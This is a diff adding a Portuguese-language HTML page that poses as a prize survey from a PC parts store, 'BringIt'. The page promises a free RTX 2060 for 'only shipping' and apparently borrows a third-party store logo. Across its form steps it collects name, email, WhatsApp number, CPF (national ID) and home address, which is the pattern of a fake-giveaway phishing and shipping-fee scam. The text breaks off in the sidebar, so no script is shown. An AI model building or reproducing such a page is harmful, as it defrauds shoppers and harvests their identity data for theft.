@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BringIt — Pesquisa Premiada</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --navy: #1a2744;
+  --navy-dark: #111c36;
+  --blue: #1ab0f5;
+  --blue-dark: #0d9fd9;
+  --blue-light: #e8f7fe;
+  --red: #e8333a;
+  --bg: #f2f3f5;
+  --white: #ffffff;
+  --text: #1a1a1a;
+  --muted: #666;
+  --border: #e0e0e0;
+  --green: #00b37e;
+}
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* TOP BAR */
+.topbar {
+  background: var(--navy);
+  text-align: center;
+  padding: 6px 16px;
+  font-size: 12px;
+  font-weight: 500;
+  color: #ffffff;
+}
+.topbar strong { color: var(--blue); }
+
+/* DESKTOP HEADER */
+header {
+  background: var(--navy);
+  position: sticky;
+  top: 0;
+  z-index: 200;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+}
+.header-top {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+.logo {
+  font-size: 24px;
+  font-weight: 800;
+  color: #fff;
+  text-decoration: none;
+  letter-spacing: -0.04em;
+  white-space: nowrap;
+  display: flex;
+  align-items: center;
+  gap: 3px;
+}
+.logo-arrow {
+  display: inline-block;
+  width: 0; height: 0;
+  border-top: 8px solid transparent;
+  border-bottom: 8px solid transparent;
+  border-left: 13px solid var(--blue);
+  margin-right: 5px;
+}
+.logo span { color: var(--blue); }
+
+.header-search {
+  flex: 1;
+  display: flex;
+  border-radius: 6px;
+  overflow: hidden;
+  height: 42px;
+}
+.header-search input {
+  flex: 1;
+  border: none;
+  outline: none;
+  padding: 0 14px;
+  font-size: 13px;
+  font-family: 'Inter', sans-serif;
+  background: #fff;
+  color: #333;
+}
+.header-search input::placeholder { color: #aaa; }
+.header-search button {
+  background: var(--blue);
+  border: none;
+  width: 50px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background 0.2s;
+  flex-shrink: 0;
+}
+.header-search button:hover { background: var(--blue-dark); }
+.header-search button svg { width: 20px; height: 20px; stroke: #fff; fill: none; stroke-width: 2.5; }
+
+.header-icons { display: flex; align-items: center; gap: 4px; }
+.icon-btn {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 2px;
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: #afc0e0;
+  font-size: 11px;
+  font-weight: 500;
+  padding: 5px 10px;
+  border-radius: 6px;
+  transition: background 0.2s, color 0.2s;
+  text-decoration: none;
+}
+.icon-btn:hover { background: rgba(255,255,255,0.1); color: #fff; }
+.icon-btn svg { width: 22px; height: 22px; stroke: currentColor; fill: none; stroke-width: 1.8; }
+
+/* MOBILE HEADER */
+.mobile-header {
+  display: none;
+  background: var(--navy);
+  padding: 10px 14px;
+  align-items: center;
+  gap: 12px;
+}
+.hamburger {
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: #fff;
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+  padding: 4px;
+}
+.hamburger span {
+  display: block;
+  width: 22px;
+  height: 2px;
+  background: #fff;
+  border-radius: 2px;
+}
+.mobile-search-bar {
+  display: none;
+  background: var(--navy);
+  padding: 0 14px 12px;
+}
+.mobile-search-bar .header-search { width: 100%; }
+
+/* CAT NAV */
+.cat-nav {
+  background: var(--navy-dark);
+  overflow-x: auto;
+  white-space: nowrap;
+  scrollbar-width: none;
+}
+.cat-nav::-webkit-scrollbar { display: none; }
+.cat-nav-inner {
+  display: inline-flex;
+  padding: 0 14px;
+  min-width: 100%;
+}
+.cat-nav a {
+  display: inline-block;
+  color: var(--navy);
+  text-decoration: none;
+  font-size: 12px;
+  font-weight: 500;
+  padding: 10px 14px;
+  border-bottom: 2px solid transparent;
+  transition: all 0.2s;
+  white-space: nowrap;
+}
+.cat-nav a:hover { color: var(--blue); border-bottom-color: var(--blue); }
+.cat-nav a.active { color: var(--blue); border-bottom-color: var(--blue); font-weight: 600; }
+
+/* BREADCRUMB */
+.breadcrumb {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 10px 16px;
+  font-size: 12px;
+  color: var(--muted);
+}
+.breadcrumb a { color: var(--blue); text-decoration: none; }
+.breadcrumb a:hover { text-decoration: underline; }
+.breadcrumb span { margin: 0 5px; color: #bbb; }
+
+/* MAIN */
+.main {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 16px 48px;
+}
+
+/* HERO BANNER */
+.hero-banner {
+  background: linear-gradient(115deg, var(--navy) 0%, #1e3a6e 55%, #0a5a8c 100%);
+  border-radius: 10px;
+  padding: 32px 40px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 24px;
+  overflow: hidden;
+  position: relative;
+}
+.hero-banner::after {
+  content: '';
+  position: absolute;
+  right: -40px; bottom: -60px;
+  width: 280px; height: 280px;
+  background: radial-gradient(circle, rgba(26,176,245,0.18) 0%, transparent 70%);
+  pointer-events: none;
+}
+.hero-tag {
+  display: inline-block;
+  background: var(--red);
+  color: #fff;
+  font-size: 11px;
+  font-weight: 700;
+  padding: 3px 10px;
+  border-radius: 4px;
+  letter-spacing: 0.07em;
+  text-transform: uppercase;
+  margin-bottom: 12px;
+}
+.hero-banner h1 {
+  font-size: clamp(22px, 3vw, 38px);
+  font-weight: 800;
+  color: #fff;
+  line-height: 1.15;
+  margin-bottom: 8px;
+  letter-spacing: -0.02em;
+}
+.hero-banner h1 em { color: var(--blue); font-style: normal; }
+.hero-banner p { color: #9bb8d8; font-size: 14px; max-width: 400px; line-height: 1.6; margin-bottom: 22px; }
+.hero-btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: var(--blue);
+  color: #fff;
+  text-decoration: none;
+  font-size: 14px;
+  font-weight: 700;
+  padding: 12px 22px;
+  border-radius: 7px;
+  transition: background 0.2s, transform 0.2s;
+}
+.hero-btn:hover { background: var(--blue-dark); transform: translateY(-1px); }
+.hero-gift { font-size: 88px; animation: float 3s ease-in-out infinite; line-height: 1; position: relative; z-index: 1; }
+@keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
+
+/* FORM LAYOUT */
+.form-layout {
+  display: grid;
+  grid-template-columns: 1fr 320px;
+  gap: 20px;
+  align-items: start;
+}
+
+/* SEARCH CARD */
+.search-card {
+  background: var(--white);
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+  overflow: hidden;
+}
+.card-head {
+  background: var(--navy);
+  padding: 15px 22px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.card-head-icon {
+  width: 36px; height: 36px;
+  background: var(--blue);
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 17px;
+  flex-shrink: 0;
+}
+.card-head h2 { font-size: 15px; font-weight: 700; color: #fff; }
+.card-head p { font-size: 11px; color: #8ba4c8; margin-top: 2px; }
+.card-body { padding: 22px; }
+
+/* STEPS */
+.steps {
+  display: flex;
+  align-items: center;
+  margin-bottom: 22px;
+}
+.step { flex: 1; text-align: center; position: relative; }
+.step:not(:last-child)::after {
+  content: '';
+  position: absolute;
+  top: 13px; left: 50%; right: -50%;
+  height: 2px;
+  background: var(--border);
+  z-index: 0;
+}
+.step.done:not(:last-child)::after { background: var(--blue); }
+.step-num {
+  width: 27px; height: 27px;
+  border-radius: 50%;
+  background: #e8e8e8;
+  color: #999;
+  font-size: 12px;
+  font-weight: 700;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 6px;
+  position: relative; z-index: 1;
+  transition: all 0.3s;
+}
+.step.active .step-num { background: var(--blue); color: #fff; box-shadow: 0 0 0 4px rgba(26,176,245,0.2); }
+.step.done .step-num { background: var(--green); color: #fff; }
+.step-label { font-size: 11px; color: #aaa; font-weight: 500; }
+.step.active .step-label { color: var(--navy); font-weight: 600; }
+.step.done .step-label { color: var(--green); }
+
+/* FORM FIELDS */
+.form-group { margin-bottom: 13px; }
+.form-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 5px; }
+.form-group input,
+.form-group select {
+  width: 100%;
+  border: 1.5px solid var(--border);
+  border-radius: 7px;
+  padding: 10px 13px;
+  font-size: 13px;
+  font-family: 'Inter', sans-serif;
+  color: var(--text);
+  background: var(--white);
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  -webkit-appearance: none;
+  appearance: none;
+}
+.form-group input:focus,
+.form-group select:focus {
+  border-color: var(--blue);
+  box-shadow: 0 0 0 3px rgba(26,176,245,0.15);
+}
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+.btn-blue {
+  width: 100%;
+  background: var(--blue);
+  color: #fff;
+  border: none;
+  border-radius: 7px;
+  padding: 13px 20px;
+  font-size: 15px;
+  font-weight: 700;
+  font-family: 'Inter', sans-serif;
+  cursor: pointer;
+  transition: all 0.2s;
+  margin-top: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+.btn-blue:hover { background: var(--blue-dark); transform: translateY(-1px); box-shadow: 0 4px 14px rgba(26,176,245,0.3); }
+
+.privacy-note { text-align: center; font-size: 11px; color: #bbb; margin-top: 10px; }
+.privacy-note a { color: var(--blue); text-decoration: none; }
+
+/* STARS */
+.stars-row { display: flex; gap: 5px; margin-top: 6px; }
+.star { font-size: 26px; cursor: pointer; transition: transform 0.15s; line-height: 1; }
+.star:hover { transform: scale(1.2); }
+
+/* SPIN LOADER */
+.spin-loader { display: none; flex-direction: column; align-items: center; gap: 16px; padding: 48px 0; }
+.spin-loader.active { display: flex; }
+.spinner {
+  width: 44px; height: 44px;
+  border: 3px solid var(--border);
+  border-top-color: var(--blue);
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.spin-loader p { color: var(--muted); font-size: 14px; font-weight: 500; }
+
+/* SIDEBAR */
+.side-card {
+  background: var(--white);
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+  overflow: hidden;
+  margin-bottom: 16px;
+}
+.side-head {
+  background: var(--navy);
+  padding: 11px 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.side-head h3 { font-size: 13px; font-weight: 700; color: #fff; }
+.side-body { padding: 14px 16px; }
+
+.how-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 11px;
+  padding: 9px 0;
+  border-bottom: 1px solid #f5f5f5;
+}
+.how-step:last-child { border-bottom: none; }
+.how-num {
+  width: 26px; height: 26px;
+  background: var(--blue-light);
+  color: var(--blue);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px;
+  font-weight: 800;
+  flex-shrink: 0;
+}
+.how-text h4 { font-size: 13px; font-weight: 600; color: var(--navy); margin-bottom: 2px; }
+.how-text p { font-size: 12px; color: var(--muted); line-height: 1.4; }
+
+.trust-list { list-style: none; }
+.trust-list li {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  padding: 8px 0;
+  font-size: 13px;
+  color: #444;
+  border-bottom: 1px solid #f5f5f5;
+}
+.trust-list li:last-child { border-bottom: none; }
+.trust-check {
+  width: 20px; height: 20px;
+  background: #e6f9f2;
+  color: var(--green);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px;
+  font-weight: 700;
+  flex-shrink: 0;
+}
+
+/* MODAL */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.55);
+  backdrop-filter: blur(5px);
+  z-index: 1000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.3s;
+}
+.modal-overlay.open { opacity: 1; pointer-events: all; }
+
+.modal {
+  background: var(--white);
+  border-radius: 14px;
+  padding: 36px 30px 26px;
+  max-width: 420px;
+  width: 100%;
+  text-align: center;
+  position: relative;
+  transform: scale(0.88) translateY(24px);
+  transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  box-shadow: 0 24px 64px rgba(0,0,0,0.22);
+}
+.modal-overlay.open .modal { transform: scale(1) translateY(0); }
+
+.modal-close {
+  position: absolute;
+  top: 12px; right: 12px;
+  background: #f0f0f0;
+  border: none;
+  color: #666;
+  width: 28px; height: 28px;
+  border-radius: 50%;
+  cursor: pointer;
+  font-size: 13px;
+  display: flex; align-items: center; justify-content: center;
+  transition: background 0.2s;
+}
+.modal-close:hover { background: #ddd; }
+
+.modal-icon {
+  width: 76px; height: 76px;
+  background: linear-gradient(135deg, var(--blue), var(--blue-dark));
+  border-radius: 20px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 36px;
+  margin: 0 auto 14px;
+  box-shadow: 0 8px 24px rgba(26,176,245,0.35);
+  animation: pop-in 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+@keyframes pop-in { 0%{transform:scale(0)rotate(-15deg)} 100%{transform:scale(1)rotate(0)} }
+
+.modal-congrats { font-size: 11px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--blue); margin-bottom: 5px; }
+.modal h2 { font-size: 20px; font-weight: 800; color: var(--navy); margin-bottom: 18px; letter-spacing: -0.02em; }
+
+.prize-box {
+  background: #f5fafd;
+  border: 1.5px solid #cce8f6;
+  border-radius: 10px;
+  padding: 14px;
+  margin-bottom: 14px;
+  text-align: left;
+}
+.prize-box-name { font-size: 14px; font-weight: 700; color: var(--navy); margin-bottom: 4px; }
+.prize-box-desc { font-size: 12px; color: var(--muted); line-height: 1.5; margin-bottom: 12px; }
+.prize-price-row { display: flex; align-items: center; justify-content: space-between; }
+.prize-old { font-size: 11px; color: #ccc; text-decoration: line-through; }
+.prize-new { font-size: 22px; font-weight: 800; color: var(--green); }
+.prize-new small { font-size: 13px; font-weight: 600; }
+.prize-badge {
+  background: #e6f9f2;
+  color: var(--green);
+  font-size: 11px;
+  font-weight: 700;
+  padding: 3px 10px;
+  border-radius: 20px;
+}
+
+.modal .btn-blue { font-size: 14px; padding: 12px; margin-top: 0; }
+.modal-footer { font-size: 11px; color: #bbb; margin-top: 10px; }
+
+/* CONFETTI */
+.confetti-piece {
+  position: fixed;
+  border-radius: 2px;
+  animation: confetti-fall 3.5s ease-in forwards;
+  pointer-events: none;
+  z-index: 9999;
+}
+@keyframes confetti-fall {
+  0%{transform:translateY(-5vh)rotate(0deg);opacity:1}
+  80%{opacity:1}
+  100%{transform:translateY(110vh)rotate(720deg);opacity:0}
+}
+
+/* FOOTER */
+footer {
+  background: var(--navy);
+  border-top: 3px solid var(--navy-dark);
+  padding: 22px 16px;
+  text-align: center;
+  color: #ffffff;
+  font-size: 12px;
+}
+footer strong { color: var(--blue); }
+
+/* RESPONSIVE */
+@media(max-width:960px) {
+  .form-layout { grid-template-columns: 1fr; }
+  .sidebar-wrap { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .hero-gift { display: none; }
+}
+@media(max-width:640px) {
+  .header-top { display: none; }
+  .mobile-header { display: flex; }
+  .mobile-search-bar { display: block; }
+  .sidebar-wrap { grid-template-columns: 1fr; }
+  .form-row { grid-template-columns: 1fr; }
+  .hero-banner { padding: 22px 18px; }
+  .card-body { padding: 16px; }
+}
+</style>
+</head>
+<body>
+
+<div class="topbar"><img src="https://cdn.discordapp.com/attachments/1425484760926388336/1491866143273783338/image.png?ex=69d9401e&is=69d7ee9e&hm=5ae42be5c92ee5fa09bf8982916cd64ee93ca487a3e7b5282424cf019ec14d99&" alt="Cupom" style="height:16px; vertical-align:middle; margin-right:5px;"> Pesquisa Premiada &nbsp;·&nbsp; Responda e ganhe uma peça de PC grátis! &nbsp;·&nbsp; <strong>Frete grátis</strong> acima de R$199</div>
+
+<!-- DESKTOP HEADER -->
+<header>
+  <div class="header-top">
+    <a href="#" class="logo"><img src="https://newimg.ebit.com.br/ebitBR/imagens/logo-lojas/logo_10333.gif" alt="Logo" style="height: 60px;"></a>
+    <div class="header-search">
+      <input type="text" placeholder="Busque por modelo, marca, série, part number...">
+      <button><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></svg></button>
+    </div>
+    <div class="header-icons">
+      <a href="#" class="icon-btn">
+        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        Entrar
+      </a>
+      <a href="#" class="icon-btn">
+        <svg viewBox="0 0 24 24"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
+        Carrinho
+      </a>
+    </div>
+  </div>
+</header>
+
+<!-- MOBILE HEADER -->
+<div class="mobile-header">
+  <button class="hamburger"><span></span><span></span><span></span></button>
+  <a href="#" class="logo" style="font-size:20px;"><img src="https://newimg.ebit.com.br/ebitBR/imagens/logo-lojas/logo_10333.gif" alt="Logo" style="height: 40px;"></a>
+  <div style="flex:1"></div>
+  <a href="#" style="color:#fff;text-decoration:none;">
+    <svg viewBox="0 0 24 24" style="width:24px;height:24px;stroke:#fff;fill:none;stroke-width:1.8;display:block"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
+  </a>
+</div>
+<div class="mobile-search-bar">
+  <div class="header-search">
+    <input type="text" placeholder="Busque por modelo, marca, série...">
+    <button><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></svg></button>
+  </div>
+</div>
+
+<!-- CAT NAV -->
+<nav class="cat-nav">
+  <div class="cat-nav-inner">
+    <a href="#">Processadores</a>
+    <a href="#">Memória RAM</a>
+    <a href="#">SSDs &amp; HDs</a>
+    <a href="#">Placas de Vídeo</a>
+    <a href="#">Placas-mãe</a>
+    <a href="#">Coolers</a>
+    <a href="#">Fontes</a>
+    <a href="#">Nobreaks</a>
+    <a href="#">Periféricos</a>
+    <a href="#" class="active">🎁 Pesquisa Premiada</a>
+  </div>
+</nav>
+
+<!-- BREADCRUMB -->
+<div class="breadcrumb">
+  <a href="#">BringIt</a><span>›</span>
+  <a href="#">Promoções</a><span>›</span>
+  Pesquisa Premiada
+</div>
+
+<main class="main">
+
+  <!-- HERO -->
+  <div class="hero-banner">
+    <div>
+      <div class="hero-tag">⚡ Edição Limitada</div>
+      <h1>Responda e <em>ganhe</em><br>uma peça de PC!</h1>
+      <p>Participe da nossa pesquisa, nos ajude a melhorar e receba uma peça de computador sorteada. Você só paga o frete!</p>
+      <a href="#form" class="hero-btn">
+        Participar agora
+        <svg viewBox="0 0 24 24" style="width:16px;height:16px;stroke:#fff;fill:none;stroke-width:2.5;"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+      </a>
+    </div>
+    <div class="hero-gift">🎁</div>
+  </div>
+
+  <!-- FORM LAYOUT -->
+  <div class="form-layout" id="form">
+
+    <!-- MAIN FORM CARD -->
+    <div class="search-card">
+      <div class="card-head">
+        <div class="card-head-icon">🏆</div>
+        <div>
+          <h2>Pesquisa Premiada BringIt</h2>
+          <p>Preencha e concorra a uma peça de computador sorteada</p>
+        </div>
+      </div>
+      <div class="card-body">
+
+        <div class="steps">
+          <div class="step active" id="step1">
+            <div class="step-num" id="sn1">1</div>
+            <div class="step-label">Prêmio</div>
+          </div>
+          <div class="step" id="step2">
+            <div class="step-num" id="sn2">2</div>
+            <div class="step-label">Dados</div>
+          </div>
+          <div class="step" id="step3">
+            <div class="step-num" id="sn3">3</div>
+            <div class="step-label">Pesquisa</div>
+          </div>
+          <div class="step" id="step4">
+            <div class="step-num" id="sn4">4</div>
+            <div class="step-label">Quiz</div>
+          </div>
+          <div class="step" id="step5">
+            <div class="step-num" id="sn5">5</div>
+            <div class="step-label">Pedido</div>
+          </div>
+        </div>
+
+        <!-- PAGE 1: Prize -->
+        <div id="page1">
+          <p>Participe da pesquisa e ganhe uma Placa de Vídeo RTX 2060 grátis!</p>
+          <div class="prize-box">
+            <div class="prize-box-name">Placa de Vídeo RTX 2060</div>
+            <div class="prize-box-desc">Potente placa de vídeo para jogos e trabalho criativo.</div>
+            <div class="prize-price-row">
+              <div class="prize-old">R$ 2.500</div>
+              <div class="prize-new">Grátis <small>(apenas frete)</small></div>
+            </div>
+            <div class="prize-badge">Prêmio Sorteado</div>
+          </div>
+          <button class="btn-blue" onclick="nextPage(1)">Participar</button>
+        </div>
+
+        <!-- PAGE 2: Data -->
+        <div id="page2" style="display:none;">
+          <div class="form-row">
+            <div class="form-group">
+              <label>Nome completo *</label>
+              <input type="text" id="nome" placeholder="Seu nome completo">
+            </div>
+            <div class="form-group">
+              <label>E-mail *</label>
+              <input type="email" id="email" placeholder="seu@email.com">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>WhatsApp *</label>
+              <input type="tel" id="phone" placeholder="(11) 99999-9999">
+            </div>
+            <div class="form-group">
+              <label>Estado *</label>
+              <select id="estado">
+                <option value="">Selecione</option>
+                <option value="AC">Acre</option>
+                <option value="AL">Alagoas</option>
+                <option value="AP">Amapá</option>
+                <option value="AM">Amazonas</option>
+                <option value="BA">Bahia</option>
+                <option value="CE">Ceará</option>
+                <option value="DF">Distrito Federal</option>
+                <option value="ES">Espírito Santo</option>
+                <option value="GO">Goiás</option>
+                <option value="MA">Maranhão</option>
+                <option value="MT">Mato Grosso</option>
+                <option value="MS">Mato Grosso do Sul</option>
+                <option value="MG">Minas Gerais</option>
+                <option value="PA">Pará</option>
+                <option value="PB">Paraíba</option>
+                <option value="PR">Paraná</option>
+                <option value="PE">Pernambuco</option>
+                <option value="PI">Piauí</option>
+                <option value="RJ">Rio de Janeiro</option>
+                <option value="RN">Rio Grande do Norte</option>
+                <option value="RS">Rio Grande do Sul</option>
+                <option value="RO">Rondônia</option>
+                <option value="RR">Roraima</option>
+                <option value="SC">Santa Catarina</option>
+                <option value="SP">São Paulo</option>
+                <option value="SE">Sergipe</option>
+                <option value="TO">Tocantins</option>
+              </select>
+            </div>
+          </div>
+          <button class="btn-blue" onclick="nextPage(2)">Próximo</button>
+        </div>
+
+        <!-- PAGE 3: Question 1 -->
+        <div id="page3" style="display:none;">
+          <p>1. Qual é o seu componente favorito de PC?</p>
+          <div class="form-group">
+            <select id="q1">
+              <option value="">Selecione</option>
+              <option value="cpu">Processador</option>
+              <option value="gpu">Placa de Vídeo</option>
+              <option value="ram">Memória RAM</option>
+              <option value="ssd">SSD</option>
+              <option value="motherboard">Placa-mãe</option>
+            </select>
+          </div>
+          <button class="btn-blue" onclick="nextPage(3)">Próximo</button>
+        </div>
+
+        <div id="page3" style="display:none;">
+          <p>2. Qual marca de placa de vídeo você prefere?</p>
+          <div class="form-group">
+            <select id="q2">
+              <option value="">Selecione</option>
+              <option value="nvidia">NVIDIA</option>
+              <option value="amd">AMD</option>
+              <option value="intel">Intel</option>
+              <option value="outra">Outra</option>
+            </select>
+          </div>
+          <button class="btn-blue" onclick="nextPage(4)">Próximo</button>
+        </div>
+
+        <div id="page4" style="display:none;">
+          <p>3. Você já montou seu próprio PC?</p>
+          <div class="form-group">
+            <select id="q3">
+              <option value="">Selecione</option>
+              <option value="sim">Sim</option>
+              <option value="nao">Não</option>
+            </select>
+          </div>
+          <button class="btn-blue" onclick="nextPage(5)">Próximo</button>
+        </div>
+
+        <div id="page5" style="display:none;">
+          <p>4. Qual é o seu orçamento médio para upgrades de PC?</p>
+          <div class="form-group">
+            <select id="q4">
+              <option value="">Selecione</option>
+              <option value="baixo">Até R$500</option>
+              <option value="medio">R$500 - R$1500</option>
+              <option value="alto">Acima de R$1500</option>
+            </select>
+          </div>
+          <button class="btn-blue" onclick="nextPage(6)">Próximo</button>
+        </div>
+
+        <div id="page6" style="display:none;">
+          <p>5. O que mais te incomoda em PCs atuais?</p>
+          <div class="form-group">
+            <select id="q5">
+              <option value="">Selecione</option>
+              <option value="preco">Preço</option>
+              <option value="desempenho">Desempenho</option>
+              <option value="compatibilidade">Compatibilidade</option>
+              <option value="suporte">Suporte</option>
+            </select>
+          </div>
+          <button class="btn-blue" onclick="nextPage(7)">Próximo</button>
+        </div>
+
+        <!-- PAGE 8-9: Quiz -->
+        <div id="page8" style="display:none;">
+          <p>Quiz: Qual é a função principal de uma placa de vídeo?</p>
+          <div class="form-group">
+            <select id="quiz1">
+              <option value="">Selecione</option>
+              <option value="processar">Processar dados</option>
+              <option value="renderizar">Renderizar gráficos</option>
+              <option value="armazenar">Armazenar dados</option>
+            </select>
+          </div>
+          <button class="btn-blue" onclick="nextPage(8)">Próximo</button>
+        </div>
+
+        <div id="page9" style="display:none;">
+          <p>Quiz: O que significa RAM?</p>
+          <div class="form-group">
+            <select id="quiz2">
+              <option value="">Selecione</option>
+              <option value="random">Random Access Memory</option>
+              <option value="read">Read Access Memory</option>
+              <option value="rapid">Rapid Access Memory</option>
+            </select>
+          </div>
+          <button class="btn-blue" onclick="nextPage(9)">Próximo</button>
+        </div>
+
+        <!-- PAGE 10: Order -->
+        <div id="page10" style="display:none;">
+          <p>Finalize seu pedido preenchendo os dados abaixo:</p>
+          <div class="form-row">
+            <div class="form-group">
+              <label>CPF *</label>
+              <input type="text" id="cpf" placeholder="000.000.000-00">
+            </div>
+            <div class="form-group">
+              <label>E-mail *</label>
+              <input type="email" id="email2" placeholder="seu@email.com">
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Nome completo *</label>
+            <input type="text" id="nome2" placeholder="Seu nome completo">
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>CEP *</label>
+              <input type="text" id="cep" placeholder="00000-000">
+            </div>
+            <div class="form-group">
+              <label>Endereço *</label>
+              <input type="text" id="endereco" placeholder="Rua, número, bairro">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Cidade *</label>
+              <input type="text" id="cidade" placeholder="Sua cidade">
+            </div>
+            <div class="form-group">
+              <label>Estado *</label>
+              <select id="estado2">
+                <option value="">Selecione</option>
+                <option value="AC">Acre</option>
+                <option value="AL">Alagoas</option>
+                <option value="AP">Amapá</option>
+                <option value="AM">Amazonas</option>
+                <option value="BA">Bahia</option>
+                <option value="CE">Ceará</option>
+                <option value="DF">Distrito Federal</option>
+                <option value="ES">Espírito Santo</option>
+                <option value="GO">Goiás</option>
+                <option value="MA">Maranhão</option>
+                <option value="MT">Mato Grosso</option>
+                <option value="MS">Mato Grosso do Sul</option>
+                <option value="MG">Minas Gerais</option>
+                <option value="PA">Pará</option>
+                <option value="PB">Paraíba</option>
+                <option value="PR">Paraná</option>
+                <option value="PE">Pernambuco</option>
+                <option value="PI">Piauí</option>
+                <option value="RJ">Rio de Janeiro</option>
+                <option value="RN">Rio Grande do Norte</option>
+                <option value="RS">Rio Grande do Sul</option>
+                <option value="RO">Rondônia</option>
+                <option value="RR">Roraima</option>
+                <option value="SC">Santa Catarina</option>
+                <option value="SP">São Paulo</option>
+                <option value="SE">Sergipe</option>
+                <option value="TO">Tocantins</option>
+              </select>
+            </div>
+          </div>
+          <button class="btn-blue" onclick="nextPage(10)">Enviar Pedido</button>
+        </div>
+
+        <!-- PAGE 11: Prize -->
+        <div id="page11" style="display:none;">
+          <p>Parabéns! Você ganhou uma Placa de Vídeo RTX 2060!</p>
+          <div class="prize-box">
+            <div class="prize-box-name">Placa de Vídeo RTX 2060</div>
+            <div class="prize-box-desc">Potente placa de vídeo para jogos e trabalho criativo.</div>
+            <div class="prize-price-row">
+              <div class="prize-old">R$ 2.500</div>
+              <div class="prize-new">Grátis <small>(apenas frete)</small></div>
+            </div>
+            <div class="prize-badge">Prêmio Sorteado</div>
+          </div>
+          <button class="btn-blue" onclick="submitForm()">Finalizar</button>
+        </div>
+
+        <div class="privacy-note">
+          Ao participar, você concorda com nossos <a href="#">termos de uso</a> e <a href="#">política de privacidade</a>.
+        </div>
+      </div>
+    </div>
+
+    <!-- SIDEBAR -->
+    <div class="sidebar-wrap">
+      <div class="side-card">
+        <div class="side-head">
+          <svg viewBox="0 0 24 24" style="width:20px;height:20px;stroke:var(--blue);fill:none;stroke-width:2;"><path d="M9 12l2 2 4-4M21 12c0 4.97-4.03 9-9 9s-9-4.03-9-9 4.03-9 9-9 9 4.03 9 9z"/></svg>
+          <h3>Como funciona</h3>
+        </div>
+        <div class="side-body">
+          <div class="how-step">
+            <div class="how-num">1</div>
+            <div class="how-text">
+              <h4>Preencha seus dados</h4>
+              <p>Informe nome, e-mail, telefone e estado.</p>
+            </div>
+          </div>
+          <div class="how-step">
+            <div class="how-num">2</div>
+            <div class="how-text">
+              <h4>Responda a pesquisa</h4>
+              <p>5 perguntas rápidas sobre PCs.</p>
+            </div>
+          </div>
+          <div class="how-step">
+            <div class="how-num">3</div>
+            <div class="how-text">
+              <h4>Ganhe o prêmio</h4>
+              <p>Receba sua RTX 2060 grátis!</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="side-card">
+        <div class="side-head">
